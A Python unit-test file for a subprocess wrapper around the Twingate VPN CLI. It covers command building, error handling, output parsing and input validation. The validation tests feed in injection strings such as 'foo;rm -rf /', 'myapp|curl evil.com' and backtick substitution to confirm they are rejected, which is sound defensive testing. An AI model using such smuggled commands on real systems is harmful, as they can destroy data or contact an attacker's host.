"""Unit tests for TwingateClient — subprocess wrapper."""

import subprocess
from unittest.mock import MagicMock, patch

import pytest

from twingate_tray.client import (
    CommandResult,
    ConnectionState,
    TwingateClient,
)


@pytest.fixture
def client() -> TwingateClient:
    return TwingateClient()


# ------------------------------------------------------------------
# _run() basics
# ------------------------------------------------------------------


class TestRun:
    """Tests for the low-level _run helper."""

    @patch("twingate_tray.client.subprocess.run")
    def test_basic_command(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = MagicMock(returncode=0, stdout="ok\n", stderr="")
        result = client._run(["status"])
        mock_run.assert_called_once()
        cmd = mock_run.call_args[0][0]
        assert cmd == ["/usr/bin/twingate", "status", "-d"]
        assert result.success is True
        assert result.stdout == "ok"

    @patch("twingate_tray.client.subprocess.run")
    def test_privileged_command(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        client._run(["start"], privileged=True)
        cmd = mock_run.call_args[0][0]
        assert cmd[0] == "/usr/bin/pkexec"
        assert "/usr/bin/twingate" in cmd

    @patch("twingate_tray.client.subprocess.run")
    def test_timeout_handling(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="twingate", timeout=15)
        result = client._run(["status"])
        assert result.success is False
        assert result.stderr == "timeout"

    @patch("twingate_tray.client.subprocess.run")
    def test_binary_not_found(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.side_effect = FileNotFoundError()
        result = client._run(["status"])
        assert result.success is False
        assert result.stderr == "not found"

    @patch("twingate_tray.client.subprocess.run")
    def test_nonzero_return_code(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="error msg")
        result = client._run(["status"])
        assert result.success is False
        assert result.stderr == "error msg"

    @patch("twingate_tray.client.subprocess.run")
    def test_custom_timeout_is_passed_through(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """A caller-supplied timeout value overrides the default."""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        client._run(["status"], timeout=42)
        _, kwargs = mock_run.call_args
        assert kwargs["timeout"] == 42

    @patch("twingate_tray.client.subprocess.run")
    def test_oserror_handling(self, mock_run: MagicMock, client: TwingateClient) -> None:
        """A generic OSError (e.g. permission denied) is handled gracefully."""
        mock_run.side_effect = OSError("permission denied")
        result = client._run(["status"])
        assert result.success is False
        assert "permission denied" in result.stderr


# ------------------------------------------------------------------
# Status parsing
# ------------------------------------------------------------------


class TestParseStatus:
    """Tests for _parse_status."""

    def test_online(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="online", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.ONLINE

    def test_offline(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="offline", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.OFFLINE

    def test_connecting(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="connecting", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.CONNECTING

    def test_paused(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="paused", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.PAUSED

    def test_unknown_state(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="some-new-state", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.UNKNOWN

    def test_failure_returns_unknown(self, client: TwingateClient) -> None:
        result = CommandResult(success=False, stdout="", stderr="error", returncode=1)
        status = client._parse_status(result)
        assert status.state == ConnectionState.UNKNOWN

    def test_verbose_with_network(self, client: TwingateClient) -> None:
        result = CommandResult(
            success=True,
            stdout="online\nNetwork: mycompany\nAccount: admin@mycompany.com",
            stderr="",
            returncode=0,
        )
        status = client._parse_status(result)
        assert status.state == ConnectionState.ONLINE
        assert status.network == "mycompany"
        assert status.account == "admin@mycompany.com"

    def test_empty_output(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.UNKNOWN

    def test_leading_trailing_whitespace_in_output(self, client: TwingateClient) -> None:
        """State detection works even when CLI output has surrounding whitespace."""
        result = CommandResult(
            success=True, stdout="  online  ", stderr="", returncode=0
        )
        status = client._parse_status(result)
        assert status.state == ConnectionState.ONLINE

    def test_mixed_case_state_title_case(self, client: TwingateClient) -> None:
        """'Online' (title-case) is recognised as ONLINE."""
        result = CommandResult(success=True, stdout="Online", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.ONLINE

    def test_mixed_case_state_upper_case(self, client: TwingateClient) -> None:
        """'ONLINE' (all-caps) is recognised as ONLINE."""
        result = CommandResult(success=True, stdout="ONLINE", stderr="", returncode=0)
        status = client._parse_status(result)
        assert status.state == ConnectionState.ONLINE

    def test_verbose_output_with_only_network(self, client: TwingateClient) -> None:
        """Verbose output missing the Account line leaves account as None."""
        result = CommandResult(
            success=True,
            stdout="online\nNetwork: mycompany",
            stderr="",
            returncode=0,
        )
        status = client._parse_status(result)
        assert status.network == "mycompany"
        assert status.account is None

    def test_verbose_output_with_only_account(self, client: TwingateClient) -> None:
        """Verbose output missing the Network line leaves network as None."""
        result = CommandResult(
            success=True,
            stdout="online\nAccount: admin@mycompany.com",
            stderr="",
            returncode=0,
        )
        status = client._parse_status(result)
        assert status.network is None
        assert status.account == "admin@mycompany.com"

    def test_verbose_output_with_empty_network_value(self, client: TwingateClient) -> None:
        """'Network: ' with no value produces network=None, not an empty string."""
        result = CommandResult(
            success=True,
            stdout="online\nNetwork: \nAccount: ",
            stderr="",
            returncode=0,
        )
        status = client._parse_status(result)
        assert status.network is None
        assert status.account is None


# ------------------------------------------------------------------
# Resource parsing
# ------------------------------------------------------------------


class TestParseResources:
    """Tests for _parse_resources."""

    def test_empty(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="", stderr="", returncode=0)
        assert client._parse_resources(result) == []

    def test_failure(self, client: TwingateClient) -> None:
        result = CommandResult(success=False, stdout="stuff", stderr="error", returncode=1)
        assert client._parse_resources(result) == []

    def test_two_column_format(self, client: TwingateClient) -> None:
        result = CommandResult(
            success=True,
            stdout="myapp.internal.com    10.0.0.1\ndb.internal.com    10.0.0.2",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 2
        assert resources[0].name == "myapp.internal.com"
        assert resources[0].address == "10.0.0.1"
        assert resources[1].name == "db.internal.com"

    def test_three_column_with_status(self, client: TwingateClient) -> None:
        result = CommandResult(
            success=True,
            stdout="myapp    10.0.0.1    active\nlocked-app    10.0.0.3    locked",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 2
        assert resources[0].is_accessible is True
        assert resources[1].is_accessible is False

    def test_skips_header_lines(self, client: TwingateClient) -> None:
        result = CommandResult(
            success=True,
            stdout="Name    Address\n---    ---\napp    10.0.0.1",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 1
        assert resources[0].name == "app"

    def test_single_column_format_name_only(self, client: TwingateClient) -> None:
        """A line with just a resource name uses the name as the address too."""
        result = CommandResult(
            success=True,
            stdout="myapp.internal.com",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 1
        assert resources[0].name == "myapp.internal.com"
        assert resources[0].address == "myapp.internal.com"

    def test_resource_with_denied_status(self, client: TwingateClient) -> None:
        """A resource whose status contains 'denied' is marked as not accessible."""
        result = CommandResult(
            success=True,
            stdout="secret-app    192.168.1.5    denied",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 1
        assert resources[0].is_accessible is False

    def test_output_with_only_header_lines_returns_empty(
        self, client: TwingateClient
    ) -> None:
        """Output containing only headers produces an empty resource list."""
        result = CommandResult(
            success=True,
            stdout="Name    Address\n---    ---",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert resources == []

    def test_whitespace_only_lines_are_skipped(self, client: TwingateClient) -> None:
        """Blank / whitespace-only lines between resources do not cause errors."""
        result = CommandResult(
            success=True,
            stdout="app1    10.0.0.1\n   \napp2    10.0.0.2",
            stderr="",
            returncode=0,
        )
        resources = client._parse_resources(result)
        assert len(resources) == 2
        assert resources[0].name == "app1"
        assert resources[1].name == "app2"


# ------------------------------------------------------------------
# Account parsing
# ------------------------------------------------------------------


class TestParseAccounts:
    """Tests for _parse_accounts."""

    def test_empty(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="", stderr="", returncode=0)
        assert client._parse_accounts(result) == []

    def test_failure_result_returns_empty_list(self, client: TwingateClient) -> None:
        """A failed CommandResult always returns an empty list."""
        result = CommandResult(success=False, stdout="some output", stderr="err", returncode=1)
        assert client._parse_accounts(result) == []

    def test_columnar_format_with_active_marker(self, client: TwingateClient) -> None:
        """Active account is marked with * at end of line."""
        result = CommandResult(
            success=True,
            stdout=(
                "EMAIL              NETWORK  NETWORK URL\n"
                "user@example.com   acme     acme.twingate.com\n"
                "user@example.com   corp     corp.twingate.com      *\n"
            ),
            stderr="",
            returncode=0,
        )
        accounts = client._parse_accounts(result)
        assert len(accounts) == 2
        assert accounts[0].is_active is False
        assert accounts[0].name == "acme (user@example.com)"
        assert accounts[0].switch_id == "user@example.com:acme"
        assert accounts[1].is_active is True
        assert accounts[1].name == "corp (user@example.com)"
        assert accounts[1].switch_id == "user@example.com:corp"

    def test_whitespace_only_lines_are_skipped(self, client: TwingateClient) -> None:
        """Lines that are blank or whitespace only do not produce account entries."""
        result = CommandResult(
            success=True,
            stdout=(
                "EMAIL              NETWORK  NETWORK URL\n"
                "user@a.com   net1     net1.twingate.com\n"
                "   \n"
                "user@b.com   net2     net2.twingate.com\n"
            ),
            stderr="",
            returncode=0,
        )
        accounts = client._parse_accounts(result)
        assert len(accounts) == 2

    def test_header_lines_are_skipped(self, client: TwingateClient) -> None:
        """EMAIL header and separator lines are ignored."""
        result = CommandResult(
            success=True,
            stdout=(
                "EMAIL              NETWORK  NETWORK URL\n"
                "---\n"
                "user@example.com   acme     acme.twingate.com\n"
            ),
            stderr="",
            returncode=0,
        )
        accounts = client._parse_accounts(result)
        assert len(accounts) == 1
        assert accounts[0].email == "user@example.com"
        assert accounts[0].network == "acme"

    def test_single_column_fallback(self, client: TwingateClient) -> None:
        """Single-column lines are treated as name-only accounts."""
        result = CommandResult(
            success=True,
            stdout="mycompany\n",
            stderr="",
            returncode=0,
        )
        accounts = client._parse_accounts(result)
        assert len(accounts) == 1
        assert accounts[0].name == "mycompany"

    def test_multiple_accounts_same_email(self, client: TwingateClient) -> None:
        """Multiple accounts with same email but different networks."""
        result = CommandResult(
            success=True,
            stdout=(
                "EMAIL              NETWORK   NETWORK URL\n"
                "user@example.com   staging   staging.twingate.com\n"
                "user@example.com   prod      prod.twingate.com       *\n"
            ),
            stderr="",
            returncode=0,
        )
        accounts = client._parse_accounts(result)
        assert len(accounts) == 2
        assert accounts[0].switch_id == "user@example.com:staging"
        assert accounts[1].switch_id == "user@example.com:prod"
        assert accounts[1].is_active is True


# ------------------------------------------------------------------
# Exit node parsing
# ------------------------------------------------------------------


class TestParseExitNodes:
    """Tests for _parse_exit_nodes."""

    def test_empty(self, client: TwingateClient) -> None:
        result = CommandResult(success=True, stdout="", stderr="", returncode=0)
        assert client._parse_exit_nodes(result) == []

    def test_failure_result_returns_empty_list(self, client: TwingateClient) -> None:
        result = CommandResult(success=False, stdout="some output", stderr="err", returncode=1)
        assert client._parse_exit_nodes(result) == []

    def test_inactive_node_with_dashes(self, client: TwingateClient) -> None:
        """TIME LEFT of '--' means the node is inactive."""
        result = CommandResult(
            success=True,
            stdout=(
                "Non-Resource traffic currently isn't being routed through Twingate\n"
                "\n"
                "EXIT NETWORK NAME                 TIME LEFT\n"
                "\U0001f464 My Exit Node     --\n"
            ),
            stderr="", returncode=0,
        )
        nodes = client._parse_exit_nodes(result)
        assert len(nodes) == 1
        assert nodes[0].name == "My Exit Node"
        assert nodes[0].is_active is False

    def test_active_node_with_time_left(self, client: TwingateClient) -> None:
        """TIME LEFT with a real duration means the node is active."""
        result = CommandResult(
            success=True,
            stdout=(
                "Routing all traffic through Twingate for 11 hours\n"
                "\n"
                "EXIT NETWORK NAME                 TIME LEFT\n"
                "\U0001f464 My Exit Node     11 hours 58 minutes\n"
            ),
            stderr="", returncode=0,
        )
        nodes = client._parse_exit_nodes(result)
        assert len(nodes) == 1
        assert nodes[0].name == "My Exit Node"
        assert nodes[0].is_active is True

    def test_cli_name_preserves_emoji(self, client: TwingateClient) -> None:
        """cli_name keeps the emoji prefix for CLI commands."""
        result = CommandResult(
            success=True,
            stdout=(
                "EXIT NETWORK NAME                 TIME LEFT\n"
                "\U0001f464 My Exit Node     --\n"
            ),
            stderr="", returncode=0,
        )
        nodes = client._parse_exit_nodes(result)
        assert "\U0001f464" in nodes[0].cli_name

    def test_status_description_lines_are_skipped(self, client: TwingateClient) -> None:
        """Status description lines are not parsed as nodes."""
        result = CommandResult(
            success=True,
            stdout=(
                "Routing all traffic through Twingate for 6 hours\n"
                "\n"
                "EXIT NETWORK NAME                 TIME LEFT\n"
                "\U0001f464 Node A     5h 30m\n"
                "\U0001f464 Node B     --\n"
            ),
            stderr="", returncode=0,
        )
        nodes = client._parse_exit_nodes(result)
        assert len(nodes) == 2
        assert nodes[0].name == "Node A"
        assert nodes[0].is_active is True
        assert nodes[1].name == "Node B"
        assert nodes[1].is_active is False

    def test_header_and_separator_lines_skipped(self, client: TwingateClient) -> None:
        result = CommandResult(
            success=True,
            stdout=(
                "EXIT NETWORK NAME                 TIME LEFT\n"
                "------\n"
                "\U0001f464 My Node     --\n"
            ),
            stderr="", returncode=0,
        )
        nodes = client._parse_exit_nodes(result)
        assert len(nodes) == 1


# ------------------------------------------------------------------
# High-level command methods (mock _run)
# ------------------------------------------------------------------


class TestCommands:
    """Tests for high-level command methods."""

    @patch.object(TwingateClient, "_run")
    def test_start(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.start()
        mock_run.assert_called_once_with(["start"], privileged=True)
        assert result.success

    @patch.object(TwingateClient, "_run")
    def test_stop(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.stop()
        mock_run.assert_called_once_with(["stop"], privileged=True)

    @patch.object(TwingateClient, "_run")
    def test_connect_calls_run_with_privileged(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """connect() resumes a paused session and requires privilege."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.connect()
        mock_run.assert_called_once_with(["connect"], privileged=True)
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_disconnect_calls_run_with_privileged(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """disconnect() pauses the session (keeps tokens) and requires privilege."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.disconnect()
        mock_run.assert_called_once_with(["disconnect"], privileged=True)
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_status_calls_run_and_returns_parsed_status(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """status() calls _run(['status']) and returns a TwingateStatus."""
        mock_run.return_value = CommandResult(True, "online", "", 0)
        result = client.status()
        mock_run.assert_called_once_with(["status"])
        assert result.state == ConnectionState.ONLINE

    @patch.object(TwingateClient, "_run")
    def test_status_verbose_passes_v_flag(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """status(verbose=True) appends '-v' to the args list."""
        mock_run.return_value = CommandResult(True, "online", "", 0)
        client.status(verbose=True)
        mock_run.assert_called_once_with(["status", "-v"])

    @patch.object(TwingateClient, "_run")
    def test_resources_without_hidden(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """resources() without include_hidden does not pass --all."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.resources(include_hidden=False)
        mock_run.assert_called_once_with(["resources"])

    @patch.object(TwingateClient, "_run")
    def test_resources_with_hidden(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.resources(include_hidden=True)
        mock_run.assert_called_once_with(["resources", "--all"])

    @patch.object(TwingateClient, "_run")
    def test_account_list_calls_run(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_list() calls _run(['account', 'list']) and returns parsed accounts."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.account_list()
        mock_run.assert_called_once_with(["account", "list"])
        assert result == []

    @patch.object(TwingateClient, "_run")
    def test_account_add_without_network(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_add() with no network arg calls _run(['account', 'add']) privileged."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.account_add()
        mock_run.assert_called_once_with(["account", "add"], privileged=True)

    @patch.object(TwingateClient, "_run")
    def test_account_add_with_network(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_add(network='foo') appends the validated network name."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.account_add(network="mycompany")
        mock_run.assert_called_once_with(["account", "add", "mycompany"], privileged=True)

    @patch.object(TwingateClient, "_run")
    def test_account_logout_without_account_id(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_logout() with no id logs out of the current account."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.account_logout()
        mock_run.assert_called_once_with(["account", "logout"], privileged=True)

    @patch.object(TwingateClient, "_run")
    def test_account_logout_with_account_id(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_logout(account_id='foo') appends the validated account id."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.account_logout(account_id="acme-corp")
        mock_run.assert_called_once_with(
            ["account", "logout", "acme-corp"], privileged=True
        )

    @patch.object(TwingateClient, "_run")
    def test_account_switch(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.account_switch("acme")
        mock_run.assert_called_once_with(["account", "switch", "acme"], privileged=True)

    @patch.object(TwingateClient, "_run")
    def test_exit_node_list_calls_run(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """exit_node_list() calls _run(['exit-node', 'list']) and returns parsed nodes."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.exit_node_list()
        mock_run.assert_called_once_with(["exit-node", "list"])
        assert result == []

    @patch.object(TwingateClient, "_run")
    def test_exit_node_start_calls_run_with_privileged(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """exit_node_start() routes traffic through the exit node (privileged)."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.exit_node_start()
        mock_run.assert_called_once_with(["exit-node", "start"], privileged=True)
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_exit_node_stop_calls_run_with_privileged(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """exit_node_stop() stops exit-node routing (privileged)."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.exit_node_stop()
        mock_run.assert_called_once_with(["exit-node", "stop"], privileged=True)
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_exit_node_switch(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.exit_node_switch("us-east-1")
        mock_run.assert_called_once_with(
            ["exit-node", "switch", "us-east-1"], privileged=True
        )

    @patch.object(TwingateClient, "_run")
    def test_desktop_start_calls_run(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """desktop_start() starts the notification feed (no privilege required)."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.desktop_start()
        mock_run.assert_called_once_with(["desktop-start"])
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_auth_without_resource(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """auth() with no resource calls _run(['auth']) without privilege."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        result = client.auth()
        mock_run.assert_called_once_with(["auth"])
        assert result.success is True

    @patch.object(TwingateClient, "_run")
    def test_auth_with_resource(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """auth(resource='myapp') appends the validated resource name."""
        mock_run.return_value = CommandResult(True, "", "", 0)
        client.auth(resource="myapp")
        mock_run.assert_called_once_with(["auth", "myapp"])

    @patch.object(TwingateClient, "_run")
    def test_version_success(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(True, "1.2.3", "", 0)
        assert client.version() == "1.2.3"

    @patch.object(TwingateClient, "_run")
    def test_version_failure(self, mock_run: MagicMock, client: TwingateClient) -> None:
        mock_run.return_value = CommandResult(False, "", "err", 1)
        assert client.version() == "unknown"


# ------------------------------------------------------------------
# Input validation (security)
# ------------------------------------------------------------------


class TestValidateArg:
    """Tests for _validate_arg — prevents option/argument injection."""

    def test_valid_account_name(self, client: TwingateClient) -> None:
        assert client._validate_arg("mycompany", "account") == "mycompany"

    def test_valid_with_dots_and_at(self, client: TwingateClient) -> None:
        assert client._validate_arg("admin@company.com", "id") == "admin@company.com"

    def test_valid_with_colons(self, client: TwingateClient) -> None:
        """Colons are permitted by the safe-arg regex."""
        assert client._validate_arg("host:8080", "resource") == "host:8080"

    def test_valid_with_slashes(self, client: TwingateClient) -> None:
        """Forward slashes are permitted by the safe-arg regex."""
        assert client._validate_arg("path/to/resource", "resource") == "path/to/resource"

    def test_rejects_dash_prefix(self, client: TwingateClient) -> None:
        with pytest.raises(ValueError, match="must not start with"):
            client._validate_arg("--help", "account")

    def test_rejects_empty(self, client: TwingateClient) -> None:
        with pytest.raises(ValueError, match="Invalid"):
            client._validate_arg("", "account")

    def test_rejects_special_chars(self, client: TwingateClient) -> None:
        with pytest.raises(ValueError, match="Invalid"):
            client._validate_arg("foo;rm -rf /", "account")

    def test_rejects_semicolon(self, client: TwingateClient) -> None:
        """Semicolons are shell metacharacters and must be rejected."""
        with pytest.raises(ValueError, match="Invalid"):
            client._validate_arg("foo;bar", "account")

    def test_rejects_pipe(self, client: TwingateClient) -> None:
        """Pipe characters are shell metacharacters and must be rejected."""
        with pytest.raises(ValueError, match="Invalid"):
            client._validate_arg("foo|bar", "account")

    def test_rejects_backtick(self, client: TwingateClient) -> None:
        """Backticks allow command substitution and must be rejected."""
        with pytest.raises(ValueError, match="Invalid"):
            client._validate_arg("`id`", "account")

    @patch.object(TwingateClient, "_run")
    def test_account_switch_rejects_option_injection(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        with pytest.raises(ValueError):
            client.account_switch("--version")
        mock_run.assert_not_called()

    @patch.object(TwingateClient, "_run")
    def test_exit_node_switch_rejects_option_injection(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        with pytest.raises(ValueError):
            client.exit_node_switch("-v")
        mock_run.assert_not_called()

    @patch.object(TwingateClient, "_run")
    def test_account_add_rejects_injection_attempt(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_add() must not call _run when the network arg is malicious."""
        with pytest.raises(ValueError):
            client.account_add(network="foo;rm -rf /")
        mock_run.assert_not_called()

    @patch.object(TwingateClient, "_run")
    def test_account_logout_rejects_injection_attempt(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """account_logout() must not call _run when the account_id is malicious."""
        with pytest.raises(ValueError):
            client.account_logout(account_id="--malicious")
        mock_run.assert_not_called()

    @patch.object(TwingateClient, "_run")
    def test_auth_rejects_injection_attempt(
        self, mock_run: MagicMock, client: TwingateClient
    ) -> None:
        """auth() must not call _run when the resource arg contains shell chars."""
        with pytest.raises(ValueError):
            client.auth(resource="myapp|curl evil.com")
        mock_run.assert_not_called()
